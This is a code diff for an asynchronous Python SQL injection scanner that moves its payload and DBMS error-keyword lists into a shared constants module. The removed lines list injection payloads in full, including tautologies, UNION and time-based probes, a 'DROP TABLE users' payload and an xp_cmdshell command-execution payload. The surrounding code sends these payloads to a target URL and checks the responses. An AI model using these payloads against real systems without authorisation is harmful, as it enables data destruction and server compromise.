@@ -2,36 +2,8 @@ import asyncio
 import aiohttp
 import time
 from urllib.parse import urlparse, parse_qs, urlencode
+from utils.constants import SQLI_PAYLOADS,SQLI_ERROR_KEYWORDS
 
-# Enhanced payloads covering different attack vectors
-PAYLOADS = [
-    "' OR '1'='1--", 
-    "' OR 1=1#",
-    "' UNION SELECT 1,2,3--",
-    "' OR SLEEP(5)--",
-    "'; DROP TABLE users--",
-    "' OR 1=CAST((SELECT 1 FROM users) AS NUMERIC)--",
-    "'; SELECT * FROM users--",
-    "'; SELECT pg_sleep(5)--",  # PostgreSQL time-based
-    "'; WAITFOR DELAY '0:0:5'--",  # MSSQL time-based
-    "'; SELECT SLEEP(5)--",
-    "'; SELECT 1 WHERE 1=1 AND SLEEP(5)--",
-    "'; SELECT 1; EXEC xp_cmdshell 'ping 127.0.0.1'--"
-]
-
-# Expanded error keywords for better DBMS detection
-ERROR_KEYWORDS = [
-    "SQL syntax", 
-    "database error", 
-    "syntax error", 
-    "ORA-", 
-    "PostgreSQL", 
-    "pg_", 
-    "Microsoft SQL Server", 
-    "MySQL", 
-    "Unclosed quotation mark", 
-    "You have an error in your SQL syntax"
-]
 
 async def run_sql_alt(target_url: str):
     parsed_url = urlparse(target_url)
@@ -67,15 +39,15 @@ async def run_sql_alt(target_url: str):
                 except Exception as e:
                     return None, None, None
 
-            for payload in PAYLOADS:
+            for payload in SQLI_PAYLOADS:
                 response_text, duration, modified_url = await send_request(payload)
                 
                 if not response_text:
                     continue
 
                 # Error-based detection
-                if any(kw in response_text for kw in ERROR_KEYWORDS):
-                    dbms = next((kw for kw in ERROR_KEYWORDS if kw in response_text), None)
+                if any(kw in response_text for kw in SQLI_ERROR_KEYWORDS):
+                    dbms = next((kw for kw in SQLI_ERROR_KEYWORDS if kw in response_text), None)
                     return {
                         "vulnerable": True,
                         "type": "error-based",
